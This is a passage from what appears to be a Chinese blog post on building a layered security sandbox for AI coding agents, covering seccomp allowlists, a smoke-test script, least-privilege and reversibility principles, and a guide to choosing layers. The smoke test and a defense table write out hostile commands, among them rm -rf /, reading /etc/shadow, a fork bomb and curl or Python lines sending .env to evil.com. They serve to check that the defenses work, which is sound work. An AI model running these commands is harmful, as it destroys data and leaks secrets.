+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;arch_prctl&#34;</span><span class="p">,</span> <span class="s2">&#34;set_tid_address&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nt">&#34;names&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;io_uring_setup&#34;</span><span class="p">,</span> <span class="s2">&#34;io_uring_enter&#34;</span><span class="p">,</span> <span class="s2">&#34;io_uring_register&#34;</span><span class="p">],</span> <span class="nt">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;SCMP_ACT_ALLOW&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>注意</strong>：上面这个 seccomp 白名单需要按实际 Agent 工作负载调。Python 进程需要的系统调用比 Node.js 多。Git 操作需要额外的调用。先在 <code>SCMP_ACT_LOG</code> 模式跑一遍，收集实际用到的调用，再收紧为 <code>SCMP_ACT_ERRNO</code>。</p>
+</blockquote>
+<h3 id="63-冒烟测试验证沙箱真的在起作用">6.3 冒烟测试——验证沙箱真的在起作用</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1"># smoke-test.sh — 验证沙箱防御能力</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;=== 测试 1: 删除根目录（应被 Hook 或容器拦截）===&#34;</span>
+</span></span><span class="line"><span class="cl">docker <span class="nb">exec</span> agent-sandbox rm -rf / 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">&#34;PASS: rm -rf / 被拦截&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;=== 测试 2: 读取 /etc/shadow（应被容器权限拦截）===&#34;</span>
+</span></span><span class="line"><span class="cl">docker <span class="nb">exec</span> agent-sandbox cat /etc/shadow 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">&#34;PASS: /etc/shadow 不可读&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;=== 测试 3: 写 .env 文件（应被敏感文件 Hook 拦截）===&#34;</span>
+</span></span><span class="line"><span class="cl">docker <span class="nb">exec</span> agent-sandbox bash -c <span class="s1">&#39;echo &#34;SECRET=leaked&#34; &gt; .env&#39;</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">&#34;PASS: .env 写入被拦截&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;=== 测试 4: 连接非白名单域名（应被代理/防火墙拦截）===&#34;</span>
+</span></span><span class="line"><span class="cl">docker <span class="nb">exec</span> agent-sandbox curl -s --connect-timeout <span class="m">3</span> https://pastebin.com 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">&#34;PASS: 非白名单域名被拦截&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;=== 测试 5: 连接云元数据端点（应被拦截）===&#34;</span>
+</span></span><span class="line"><span class="cl">docker <span class="nb">exec</span> agent-sandbox curl -s --connect-timeout <span class="m">3</span> http://169.254.169.254/latest/meta-data/ 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">&#34;PASS: 元数据端点被拦截&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;=== 测试 6: 安装未签名包（pip/npm 不受信任源）===&#34;</span>
+</span></span><span class="line"><span class="cl">docker <span class="nb">exec</span> agent-sandbox pip install --index-url https://malicious.example.com/simple/ evil-pkg 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">&#34;PASS: 不受信 pip 源被拦截（网络白名单生效）&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;=== 测试 7: 资源耗尽（fork 炸弹）===&#34;</span>
+</span></span><span class="line"><span class="cl">docker <span class="nb">exec</span> agent-sandbox bash -c <span class="s1">&#39;:(){ :|:&amp; };:&#39;</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">&#34;PASS: pids-limit 阻止了 fork 炸弹&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;=== 全部通过 ===&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>每加一层沙箱，跑一遍这个冒烟测试——确保加的防御真的在起作用，不是配置了但实际没生效。</p>
+<hr>
+<h2 id="7-沙箱设计的四个原则">7. 沙箱设计的四个原则</h2>
+<p>写完四层，回到设计层面。下面几条原则和实践，决定了你的沙箱是&quot;真能防住&quot;还是&quot;自以为防住了&quot;。</p>
+<h3 id="71-最小权限不是最小麻烦">7.1 最小权限，不是最小麻烦</h3>
+<p>最小权限的意思是：Agent 只拿它完成当前任务<strong>必需的最小权限集合</strong>。不是&quot;先全给，出事了再收&quot;。</p>
+<p>实践：任务启动前，声明这个任务需要哪些权限（读哪些目录、访问哪些域名、调哪些工具），其他全关。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 任务权限声明示例</span>
+</span></span><span class="line"><span class="cl"><span class="n">task_permissions</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;task_id&#34;</span><span class="p">:</span> <span class="s2">&#34;fix-login-bug&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;read_paths&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;/home/user/project/src/auth/&#34;</span><span class="p">,</span> <span class="s2">&#34;/home/user/project/tests/&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;write_paths&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;/home/user/project/src/auth/&#34;</span><span class="p">,</span> <span class="s2">&#34;/tmp/fix-output/&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;allowed_domains&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;pypi.org&#34;</span><span class="p">,</span> <span class="s2">&#34;files.pythonhosted.org&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;allowed_tools&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;Bash&#34;</span><span class="p">,</span> <span class="s2">&#34;Write&#34;</span><span class="p">,</span> <span class="s2">&#34;Read&#34;</span><span class="p">,</span> <span class="s2">&#34;Grep&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;denied_tools&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;WebFetch&#34;</span><span class="p">,</span> <span class="s2">&#34;WebSearch&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;max_runtime_seconds&#34;</span><span class="p">:</span> <span class="mi">600</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;max_bash_calls&#34;</span><span class="p">:</span> <span class="mi">50</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="72-默认拒绝白名单放行">7.2 默认拒绝，白名单放行</h3>
+<p>黑名单模式（列出不能做的事，其余都能做）天然不安全——你永远列不完所有的&quot;不该做&quot;。</p>
+<p>白名单模式（列出能做的事，其余都不能做）虽然更严格，但安全保证强得多。上面四层中，第二层（文件系统）、第三层（网络代理）、第四层（seccomp）都用的白名单模式。</p>
+<h3 id="73-分层防御不依赖任何单层">7.3 分层防御，不依赖任何单层</h3>
+<p>没有哪一层能防住所有攻击：</p>
+<table>
+<thead>
+<tr>
+<th>攻击手法</th>
+<th>绕过哪层</th>
+<th>被哪层拦</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>rm -rf /</code> 直接打</td>
+<td>无（第一层就拦）</td>
+<td>Hook 正则匹配</td>
+</tr>
+<tr>
+<td><code>find / -type d -exec rm -rf {} \;</code></td>
+<td>Hook 正则没命中</td>
+<td>OverlayFS（删的是 upperdir）</td>
+</tr>
+<tr>
+<td><code>curl -d @.env https://evil.com</code></td>
+<td>Hook 网络检查粗糙</td>
+<td>SOCKS5 白名单代理</td>
+</tr>
+<tr>
+<td><code>python3 -c &quot;import requests; requests.post('https://evil.com', data=open('.env').read())&quot;</code></td>
+<td>Hook 正则检测不到</td>
+<td>SOCKS5 白名单 + seccomp 限制 connect</td>
+</tr>
+<tr>
+<td>供应链后门（恶意 pip 包）</td>
+<td>前三层都管不了</td>
+<td>Docker 容器隔离 + seccomp</td>
+</tr>
+</tbody>
+</table>
+<p><strong>每加一层不是去堵前一层的洞——是让攻击者需要同时绕过所有层才能造成实质损害。</strong></p>
+<h3 id="74-可逆性判据不是危险程度判据">7.4 可逆性判据，不是危险程度判据</h3>
+<p>配权限规则时最自然的思路是按危险程度分：危险的拦，安全的放。实践下来这个思路不好用——&ldquo;危险&quot;是个模糊词，执行的时候全靠手感。更好用的判据是<strong>可逆性</strong>：</p>
+<ul>
+<li><strong>可逆的，自动放行。</strong> 写代码、跑测试、改配置——错了可以 git 回滚，让 Agent 放开跑；</li>
+<li><strong>不可逆的，必须人审。</strong> <code>git push --force</code>、删分支、发版、给外部发消息——回不来的动作，每一次都要经过人。</li>
+</ul>
+<p>还有一个坑：<strong>ask 疲劳。</strong> 权限问得太频繁，人会进入&quot;连续点同意&quot;的肌肉记忆，问等于没问。ask 名单要压到最短——只放真正不可逆的那几个动作。拦得太碎的权限模型，和没有权限模型是同一个东西。</p>
+<h3 id="75-hook-级拦截-vs-容器级隔离怎么选">7.5 Hook 级拦截 vs 容器级隔离：怎么选</h3>
+<p>这是搭沙箱时最实际的取舍。两层的性格完全相反：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Hook 级拦截</th>
+<th>容器/VM 级隔离</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>隔离强度</td>
+<td>同一内核，可绕过</td>
+<td>独立环境，拿到 root 也只是容器的 root</td>
+</tr>
+<tr>
+<td>开销</td>
+<td>几乎为零</td>
+<td>镜像、启动、资源占用</td>
+</tr>
+<tr>
+<td>语义理解</td>
+<td>强——能读懂&quot;这条命令想干嘛&rdquo;</td>
+<td>无——只看系统调用</td>
+</tr>
+<tr>
+<td>报错体验</td>
+<td>好——拦的时候能说清为什么</td>
+<td>粗暴——直接失败</td>
+</tr>
+<tr>
+<td>工具链兼容</td>
+<td>无感——本地环境直接用</td>
+<td>割裂——缓存、凭证、IDE 都要重新安排</td>
+</tr>
+<tr>
+<td>最大软肋</td>
+<td>配置在 Agent 够得着的地方就失效</td>
+<td>默认网络是通的，容易假隔离</td>
+</tr>
+</tbody>
+</table>
+<p>我的答案是<strong>两层都要，各管一段</strong>：</p>
+<ul>
+<li><strong>Hook 管体验。</strong> 它在动作发生之前拦，能给出&quot;为什么拦你&quot;的明确反馈，Agent 可以据此调整行为。这一层解决的是日常开发里的 95%。</li>
+<li><strong>容器管底线。</strong> 它不解释、不商量，Hook 被绕了、提示注入成功了，人也出不了这个屋子。这一层解决的是剩下的 5%——而安全事故全在这 5% 里。</li>
+</ul>
+<p>什么场景必须上容器？三个：<strong>跑不可信代码</strong>（评测开源项目、跑陌生依赖）、<strong>处理不可信输入</strong>（读网页、读 issue 的 Agent）、<strong>多 Agent 并发</strong>（一个被注入，不能拖垮全部）。日常写业务代码，Hook + 权限模型够用。</p>
+<p>安全领域的老原则&quot;纵深防御&quot;（defense in depth），在 Agent 时代原样复活。单层防线的设计前提都是&quot;这层不会破&quot;，而历史告诉我们每一层都会破。</p>
+<hr>
+<h2 id="8-选型指南你的场景该上到第几层">8. 选型指南：你的场景该上到第几层</h2>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>推荐层数</th>
+<th>配置</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>本地小项目、个人使用</td>
+<td>第 1 层</td>
+<td>Hook 预检 + 敏感文件保护</td>
+</tr>
+<tr>
+<td>团队开发、CI/CD</td>
+<td>第 1+2 层</td>
+<td>Hook 预检 + Worktree + 敏感文件保护</td>
+</tr>
+<tr>
+<td>SaaS 平台、用户提交的代码</td>
+<td>第 1+2+3 层</td>
+<td>Hook + Worktree + 网络白名单代理</td>
+</tr>
+<tr>
+<td>运行不受信代码、安全敏感场景</td>
+<td>全部 4 层</td>
+<td>Hook + OverlayFS + SOCKS5 + Docker + seccomp</td>
+</tr>
+</tbody>
+</table>
+<p>我的个人 Devspace 用了第 1+2 层——Hook 拦截危险命令 + Worktree 隔离 + 敏感文件保护。够用且开销极低。如果你在做一个让用户上传代码并让 AI 自动修 bug 的 SaaS，直接上全部四层，别省。</p>
+<hr>
+<h2 id="9-和系列其他组件的关系">9. 和系列其他组件的关系</h2>
+<p>沙箱是 Harness 六组件中&quot;工具系统设计&quot;的安全子集。它和同系列的其他组件有明确的边界：</p>
+<table>
+<thead>
+<tr>
+<th>组件</th>
+<th>沙箱管什么</th>
+<th>那个组件管什么</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>执行编排</td>
+<td>不管 — 编排只管&quot;谁做什么、顺序&quot;</td>
+<td>沙箱里的 Agent 照样按编排跑</td>
+</tr>
+<tr>
+<td>状态记忆</td>
+<td>不管 — 记忆只管&quot;不丢信息&quot;</td>
+<td>沙箱重启了记忆还能恢复</td>
+</tr>
+<tr>
+<td>独立评估</td>
+<td>单向配合 — 评估系统跑在沙箱外</td>
+<td>评估 Agent 输出的质量，不受沙箱限制</td>
+</tr>
+<tr>
+<td>约束恢复</td>
+<td>紧耦合 — 沙箱定了&quot;什么不能做&quot;</td>
+<td>约束恢复定了&quot;越界后怎么办&quot;</td>
+</tr>
+</tbody>
+</table>
+<p>沙箱画了圈，圈内的 Agent 可以自由活动。圈外的东西——评估系统、编排引擎、审计日志——在圈外运行，不受沙箱限制。这个&quot;圈内圈外&quot;的分工，是 Harness 体系的核心设计决策。</p>
+<hr>
+<h2 id="10-结语">10. 结语</h2>
+<p>回到凌晨三点的那个电话。如果我的朋友当时配了第一层 Hook，<code>rm -rf /home/user/project/data /*</code> 在发到 shell 之前就会被拦截——正则 <code>rm\s+-rf\s+/</code> 一匹配，直接 block，Agent 连执行的机会都没有。</p>
+<p>但 Hook 只是第一道防线。真正让人安心的，是知道还有三层在后面：文件删了有 OverlayFS，数据想外传有网络白名单，想逃逸有 seccomp 挡着。</p>
+<p>沙箱不是让 Agent 变笨。是让 Agent <strong>只能做好事</strong>。你做 Harness Engineering 的目标从&quot;调 prompt 让它不犯错&quot;变成&quot;改造环境让错误犯不了&quot;——这才是 Harness 系列的题眼。</p>
+<hr>
+<p><em>感谢阅读。</em></p>
+<div class="post-series-nav">
+                <em>本文是「<a href="/series/harness-engineering/">AI 编程·Harness Engineering</a>」系列第 2 篇，共 2 篇。上一篇：<a href="/posts/2026/07/03/harness-engineering-intro/">Harness Engineering 入门：从 Prompt 到 Context 到 Harness，Agent 工程的最后一层</a>。</em>
+            </div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2026-07-23&nbsp;<a class="git-hash" href="https://github.com/whitefirer/mysite/commit/e1635f2a5a92b7ea3091f23b3067486ffeafc77e" target="_blank" title="commit by whitefirer(whitefirer@gmail.com) e1635f2a5a92b7ea3091f23b3067486ffeafc77e: chore: publish harness engineering sandbox article">
+                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>e1635f2</a></span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/posts/2026/07/19/harness-engineering-sandbox/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://whitefirer.org/posts/2026/07/19/harness-engineering-sandbox/" data-title="Harness Engineering 之二：给 Agent 搭一个安全沙箱" data-hashtags="tech,ai,harness engineering,agent,sandbox,claude code,security"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://whitefirer.org/posts/2026/07/19/harness-engineering-sandbox/" data-hashtag="tech"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://whitefirer.org/posts/2026/07/19/harness-engineering-sandbox/" data-title="Harness Engineering 之二：给 Agent 搭一个安全沙箱"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://whitefirer.org/posts/2026/07/19/harness-engineering-sandbox/" data-title="Harness Engineering 之二：给 Agent 搭一个安全沙箱"><i data-svg-src="https://fastly.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://whitefirer.org/posts/2026/07/19/harness-engineering-sandbox/" data-title="Harness Engineering 之二：给 Agent 搭一个安全沙箱"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微信" onclick="var d=document.getElementById('wechat-qr-fb51d6050d0acded4f74e1e02f665334');d.style.display=d.style.display==='none'?'block':'none';return false"><i class="fab fa-weixin fa-fw" aria-hidden="true"></i></a>
+        <div id="wechat-qr-fb51d6050d0acded4f74e1e02f665334" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);z-index:9999" onclick="this.style.display='none'">
+            <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:20px;border-radius:8px;text-align:center">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=https%3a%2f%2fwhitefirer.org%2fposts%2f2026%2f07%2f19%2fharness-engineering-sandbox%2f" alt="微信扫一扫" style="display:block">
+                <p style="margin:10px 0 0;font-size:14px;color:#333">微信扫一扫 · 分享文章</p>
+            </div>
+        </div></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/tech/">技术</a>,&nbsp;<a href="/tags/ai/">Ai</a>,&nbsp;<a href="/tags/harness-engineering/">Harness Engineering</a>,&nbsp;<a href="/tags/agent/">Agent</a>,&nbsp;<a href="/tags/sandbox/">Sandbox</a>,&nbsp;<a href="/tags/claude-code/">Claude Code</a>,&nbsp;<a href="/tags/security/">Security</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2026/07/19/dutch-pasture-ai-era/" class="prev" rel="prev" title="荷兰牧场与 AI 时代：别让旧思维束缚了想象力"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>荷兰牧场与 AI 时代：别让旧思维束缚了想象力</a></div>
+
+</div>
+<div id="comments"><div id="waline" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/">Waline</a>.
+            </noscript><div id="giscus" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://giscus.app">Giscus</a>.
+            </noscript></div></article>
+<script>(function(){var b=document.getElementById('reading-progress');if(!b)return;function u(){var h=document.documentElement,s=h.scrollHeight-h.clientHeight,w=s>0?Math.min((h.scrollTop||document.body.scrollTop)/s*100,100):0;b.style.width=w+'%'}window.addEventListener('scroll',u,{passive:true});u()})();</script></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.131.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/whitefirer/iLoveIt" target="_blank" rel="noopener noreffer" title="iLoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> iLoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://whitefirer.org" target="_blank">whitefirer</a></span><img src="https://hits.sh/whitefirer.org.svg" alt="" aria-hidden="true" style="position:absolute;width:1px;height:1px;opacity:0;clip:rect(0 0 0 0);pointer-events:none"></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/waline/waline.min.css"><script type="text/javascript" src="/lib/waline/waline.js"></script><script type="text/javascript" src="https://fastly.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://fastly.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://fastly.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://fastly.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://fastly.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config=Object.assign(window.config||{},{"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{"giscus":{"category":"Comments","categoryId":"DIC_kwDOH2gmzc4CQ_fM","darkTheme":"dark","emitMetadata":"0","inputPosition":"bottom","lang":"zh-CN","lazyLoading":true,"lightTheme":"light","mapping":"pathname","reactionsEnabled":"1","repo":"whitefirer/whitefirer.github.io","repoId":"R_kgDOH2gmzQ"},"waline":{"dark":"auto","el":"#waline","lang":"zh-CN","pageSize":10,"requiredMeta":["nick","mail"],"serverURL":"https://comment.whitefirer.org"}},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"lunr"}});</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">!function(){function svgToPng(svg,cb){var c=svg.cloneNode(!0),d=new XMLSerializer().serializeToString(c),img=new Image(),cv=document.createElement('canvas'),w=c.viewBox.animVal.width||c.getBoundingClientRect().width||400,h=c.viewBox.animVal.height||c.getBoundingClientRect().height||300,s=2;cv.width=w*s,cv.height=h*s;var ctx=cv.getContext('2d'),b=new Blob([d],{type:'image/svg+xml;charset=utf-8'}),u=URL.createObjectURL(b);img.onload=function(){ctx.fillStyle='#fff',ctx.fillRect(0,0,cv.width,cv.height),ctx.drawImage(img,0,0,cv.width,cv.height),URL.revokeObjectURL(u),cv.toBlob(function(blob){var a=document.createElement('a');a.href=URL.createObjectURL(blob);var id=svg.id||'diagram';a.download=id+'.png',a.click(),URL.revokeObjectURL(a.href),cb&&cb()})},img.src=u}function addSaveBtn(svg){if(svg.closest('.mermaid-stage,.mermaid-fs-overlay,.mermaid-wrapper,.mermaid-toolbar,.svg-diagram-wrap'))return;var wrap=document.createElement('div');wrap.className='svg-diagram-wrap';var d=svg.style.display||'block',w=svg.style.width||svg.getAttribute('width')||'100%',mw=svg.style.maxWidth||'',m=svg.style.margin||'';wrap.style.cssText='position:relative;display:'+d+';width:'+w+';'+(mw?'max-width:'+mw+';':'')+(m?'margin:'+m+';':'')+'line-height:0';svg.style.display='block';svg.style.width='100%';svg.style.maxWidth='';svg.style.margin='0';svg.parentNode.insertBefore(wrap,svg);wrap.appendChild(svg);var bar=document.createElement('div');bar.style.cssText='text-align:right;padding-top:6px';var btn=document.createElement('button');btn.className='svg-save-btn',btn.innerHTML='<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;margin-right:3px"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg><span style="vertical-align:middle;font-size:12px">保存图片</span>',btn.style.cssText='background:none;border:1px solid transparent;border-radius:4px;padding:2px 6px;cursor:pointer;color:#b0b7c3;font-family:system-ui,sans-serif;line-height:1';bar.appendChild(btn);wrap.appendChild(bar);btn.onmouseenter=function(){btn.style.color='#6366f1';btn.style.borderColor='#e5e7eb'};btn.onmouseleave=function(){btn.style.color='#b0b7c3';btn.style.borderColor='transparent'};btn.onclick=function(e){e.stopPropagation();var orig=btn.innerHTML;btn.innerHTML='<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:3px"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><span style="vertical-align:middle;font-size:12px">导出中...</span>';btn.disabled=!0;svgToPng(svg,function(){btn.innerHTML=orig;btn.disabled=!1})}}function initSvgButtons(){document.querySelectorAll('.content svg').forEach(function(svg){addSaveBtn(svg)})}if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',initSvgButtons);else initSvgButtons()}()</script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-70Q8REKE17', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-70Q8REKE17" async></script></body>
+</html>
